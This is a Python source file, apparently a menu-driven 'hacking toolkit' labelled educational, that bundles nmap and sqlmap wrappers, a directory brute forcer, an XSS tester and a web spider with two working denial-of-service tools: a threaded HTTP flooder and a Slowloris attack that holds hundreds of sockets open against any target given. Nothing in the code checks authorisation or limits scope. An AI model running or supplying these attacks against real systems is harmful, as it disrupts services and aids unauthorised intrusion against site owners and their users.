import socket
import requests
import threading
import argparse
import sys
import time
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin
import random
import subprocess 
import os

# --- Utility Functions ---
def print_banner(tool_name):
    """Prints a cool-looking banner for the tool."""
    print("=" * 50)
    print(f" {tool_name.upper()} ".center(50, "*"))
    print("=" * 50)

def get_input(prompt):
    """Gets user input with a fancy prompt."""
    return input(f"[+] {prompt}: ")

# --- Core Hacking Tools ---
class PortScanner:
    """Scans for open ports on a target using Nmap."""
    def __init__(self, target, nmap_path='nmap'):
        self.target = target
        self.nmap_path = nmap_path

    def run(self):
        """Runs Nmap to scan the target."""
        print_banner("Nmap Port Scanner")
        try:
            command = [self.nmap_path, '-sV', '-p-', self.target]  # -sV for service version detection, -p- for all ports
            print(f"Executing: {' '.join(command)}")
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()

            if stderr:
                print(f"Error: {stderr.decode()}")
            else:
                print(stdout.decode())

        except FileNotFoundError:
            print(f"Error: Nmap not found at {self.nmap_path}. Make sure it's installed and in your PATH.")
        except Exception as e:
            print(f"An unexpected error occurred: {e}")

class DirectoryBruteForcer:
    """Brute-forces directories on a web server."""
    def __init__(self, url, wordlist_path):
        self.url = url
        self.wordlist_path = wordlist_path

    def brute_directory(self, directory):
        """Tests if a directory exists."""
        url = f"{self.url.rstrip('/')}/{directory}"
        try:
            response = requests.get(url)
            if response.status_code == 200:
                print(f" Found directory: {url}")
            elif response.status_code == 404:
                pass
            else:
                print(f" {url} - Status Code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f" Error: {e}")

    def run(self):
        print_banner("Directory Brute Forcer")
        """Runs the directory brute-force attack."""
        with open(self.wordlist_path, 'r') as wordlist_file:
            directories = [line.strip() for line in wordlist_file]

        threads = []
        for directory in directories:
            thread = threading.Thread(target=self.brute_directory, args=(directory,))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

class HeaderAnalyzer:
    """Analyzes HTTP headers of a website."""
    def __init__(self, url):
        self.url = url

    def run(self):
        """Fetches and analyzes HTTP headers."""
        print_banner("Header Analyzer")
        try:
            response = requests.get(self.url)
            headers = response.headers
            print("HTTP Headers:")
            for key, value in headers.items():
                print(f" {key}: {value}")
        except requests.exceptions.RequestException as e:
            print(f" Error: {e}")

class LinkExtractor:
    """Extracts links from a website."""
    def __init__(self, url):
        self.url = url

    def run(self):
        """Extracts and prints links from the website."""
        print_banner("Link Extractor")
        try:
            response = requests.get(self.url)
            soup = BeautifulSoup(response.content, 'html.parser')
            links = []
            for a_tag in soup.find_all('a', href=True):
                links.append(a_tag['href'])

            print("Links Found:")
            for link in links:
                print(f" - {link}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

class DDOSAttacker:
    """Performs a simple DDoS attack."""
    def __init__(self, url, num_threads=100):
        self.url = url
        self.num_threads = num_threads

    def attack(self):
        """Sends continuous requests to the target URL."""
        try:
            while True:
                requests.get(self.url)
                print(f" Sending request to {self.url}")
        except requests.exceptions.RequestException as e:
            print(f" Error: {e}")

    def run(self):
        """Starts multiple threads to perform the DDoS attack."""
        print_banner("DDoS Attacker")
        print(f"Launching DDoS attack on {self.url} with {self.num_threads} threads...")
        threads = []
        for _ in range(self.num_threads):
            thread = threading.Thread(target=self.attack)
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

class Slowloris:
    """Implements a Slowloris DoS attack."""
    def __init__(self, target, port=80, num_sockets=200):
        self.target = target
        self.port = port
        self.num_sockets = num_sockets
        self.sockets = []

    def create_socket(self):
        """Creates a socket and sends partial HTTP headers."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((self.target, self.port))
            sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode('utf-8'))
            sock.send(f"Host: {self.target}\r\n".encode('utf-8'))
            sock.send(f"User-Agent: {random.choice(user_agents)}\r\n".encode('utf-8'))
            sock.send("Connection: keep-alive\r\n\r\n".encode('utf-8'))
            return sock
        except socket.error as e:
            print(f"Error creating socket: {e}")
            return None

    def run(self):
        """Launches the Slowloris attack."""
        print_banner("Slowloris DoS")
        print(f"Launching Slowloris attack on {self.target}:{self.port} with {self.num_sockets} sockets...")

        # Create initial sockets
        for _ in range(self.num_sockets):
            sock = self.create_socket()
            if sock:
                self.sockets.append(sock)

        while True:
            # Send keep-alive headers
            print(f"Sending keep-alive headers... (Sockets: {len(self.sockets)})")
            for sock in list(self.sockets):
                try:
                    sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode('utf-8'))
                except socket.error as e:
                    print(f"Error sending data, removing socket: {e}")
                    self.sockets.remove(sock)

            # Replenish sockets if needed
            while len(self.sockets) < self.num_sockets:
                sock = self.create_socket()
                if sock:
                    self.sockets.append(sock)
                else:
                    break

            time.sleep(15)

class SQLInjector:
    """Tests for SQL injection vulnerabilities using SQLmap."""
    def __init__(self, url, sqlmap_path='sqlmap'):
        self.url = url
        self.sqlmap_path = sqlmap_path

    def run(self):
        """Runs SQLmap on the target URL."""
        print_banner("SQLmap SQL Injection Tester")
        try:
            command = [self.sqlmap_path, '-u', self.url, '--batch', '--level=5', '--risk=3']
            print(f"Executing: {' '.join(command)}")
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()

            if stderr:
                print(f"Error: {stderr.decode()}")
            else:
                print(stdout.decode())

        except FileNotFoundError:
            print(f"Error: SQLmap not found at {self.sqlmap_path}. Make sure it's installed and in your PATH.")
        except Exception as e:
            print(f"An unexpected error occurred: {e}")

class XSSScanner:
    """Scans for XSS vulnerabilities."""
    def __init__(self, url, params):
        self.url = url
        self.params = params
        self.xss_payload = "<script>alert('XSS')</script>"

    def test_xss(self, param, payload):
        """Tests a single parameter for XSS."""
        url = f"{self.url}?{param}={payload}"
        try:
            response = requests.get(url)
            if payload in response.text:
                print(f" XSS Vulnerability found in parameter '{param}'")
                print(f" Payload: {payload}")
            else:
                print(f" No XSS Vulnerability found in parameter '{param}'")
        except requests.exceptions.RequestException as e:
            print(f" Error: {e}")

    def run(self):
        """Runs XSS tests on all provided parameters."""
        print_banner("XSS Scanner")
        for param in self.params:
            print(f" Testing parameter: {param}")
            self.test_xss(param, self.xss_payload)

class WebSpider:
    """Crawls a website and extracts all URLs."""
    def __init__(self, url, max_depth=3):
        self.url = url
        self.max_depth = max_depth
        self.visited = set()

    def crawl(self, url, depth):
        """Recursively crawls the website."""
        if depth > self.max_depth or url in self.visited:
            return

        try:
            self.visited.add(url)
            print(f"Crawling: {url} (Depth: {depth})")
            response = requests.get(url)
            soup = BeautifulSoup(response.content, 'html.parser')

            for a_tag in soup.find_all('a', href=True):
                absolute_url = urljoin(self.url, a_tag['href'])
                absolute_url = absolute_url.split('#')[0]  # Remove anchor links
                self.crawl(absolute_url, depth + 1)

        except requests.exceptions.RequestException as e:
            print(f"Error crawling {url}: {e}")
        except Exception as e:
            print(f"Unexpected error crawling {url}: {e}")

    def run(self):
        """Starts the web spider."""
        print_banner("Web Spider")
        print(f"Starting web spider at {self.url} with max depth {self.max_depth}...")
        self.crawl(self.url, 1)
        print("Crawling complete.")

# --- Data ---
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/603.2.4 (KHTML, like Gecko) Version/10.1.1 Safari/603.2.4",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0"
]

# --- Main Function ---
def main():
    print_banner("Hacking Toolkit")

    parser = argparse.ArgumentParser(description="A cool hacking toolkit for educational purposes.")
    parser.add_argument("-t", "--target", help="Target IP address or URL")
    parser.add_argument("-w", "--wordlist", help="Path to the wordlist file")
    parser.add_argument("-p", "--params", help="Comma-separated list of parameters to test (e.g., id,name)")
    parser.add_argument("--threads", type=int, default=100, help="Number of threads for DDoS attack")
    parser.add_argument("--sockets", type=int, default=200, help="Number of sockets for Slowloris attack")
    parser.add_argument("--port", type=int, default=80, help="Port for Slowloris attack")
    parser.add_argument("--nmap_path", default='nmap', help="Path to Nmap executable")
    parser.add_argument("--sqlmap_path", default='sqlmap', help="Path to SQLmap executable")
    args = parser.parse_args()

    if not args.target:
        target = get_input("Enter target IP address or URL")
    else:
        target = args.target

    if not args.wordlist:
        wordlist_path = get_input("Enter path to the wordlist file (for directory brute-forcing)")
    else:
        wordlist_path = args.wordlist

    if not args.params:
        params_str = get_input("Enter comma-separated list of parameters to test (e.g., id,name)")
        params = [p.strip() for p in params_str.split(',')]
    else:
        params = [p.strip() for p in args.params.split(',')]

    while True:
        print("\nChoose a tool:")
        print("1. Nmap Port Scanner")
        print("2. Directory Brute Forcer")
        print("3. Header Analyzer")
        print("4. Link Extractor")
        print("5. DDoS Attacker")
        print("6. Slowloris DoS")
        print("7. SQLmap SQL Injection Tester")
        print("8. XSS Scanner")
        print("9. Web Spider")
        print("10. Exit")

        choice = input("Enter your choice: ")

        if choice == '1':
            port_scanner = PortScanner(target, nmap_path=args.nmap_path)
            port_scanner.run()
        elif choice == '2':
            directory_brute_forcer = DirectoryBruteForcer(target, wordlist_path)
            directory_brute_forcer.run()
        elif choice == '3':
            header_analyzer = HeaderAnalyzer(target)
            header_analyzer.run()
        elif choice == '4':
            link_extractor = LinkExtractor(target)
            link_extractor.run()
        elif choice == '5':
            ddos_attacker = DDOSAttacker(target, num_threads=args.threads)
            ddos_attacker.run()
        elif choice == '6':
            slowloris = Slowloris(target, port=args.port, num_sockets=args.sockets)
            slowloris.run()
        elif choice == '7':
            sql_injector = SQLInjector(target, sqlmap_path=args.sqlmap_path)
            sql_injector.run()
        elif choice == '8':
            xss_scanner = XSSScanner(target, params)
            xss_scanner.run()
        elif choice == '9':
            web_spider = WebSpider(target)
            web_spider.run()
        elif choice == '10':
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main()
